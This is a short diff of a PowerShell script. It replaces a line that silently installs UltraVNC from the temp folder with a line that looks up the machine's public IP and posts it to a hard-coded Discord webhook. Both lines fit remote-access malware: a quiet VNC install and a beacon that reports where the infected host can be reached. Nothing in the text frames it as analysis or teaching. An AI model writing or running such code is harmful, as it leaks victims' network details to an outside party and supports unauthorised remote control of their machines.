@@ -1,1 +1,1 @@
-Start-Process "$env:temp\UltraVNC_1436_X86_Setup.exe" -ArgumentList "/S /D=$env:temp\UltraVNC"
+$webhook="https://discord.com/api/webhooks/1307484158192390165/Fj0EjVersk-B9aqImHM-ZvVeF3UNvRIUavceJVJmx2uxCO2qJTV4kB93vJj8jBPheAVt";Invoke-RestMethod -Uri $webhook -Method Post -ContentType 'application/json' -Body (@{content="Public IP: $(Invoke-RestMethod -Uri 'https://api.ipify.org?format=text')"} | ConvertTo-Json -Depth 1)
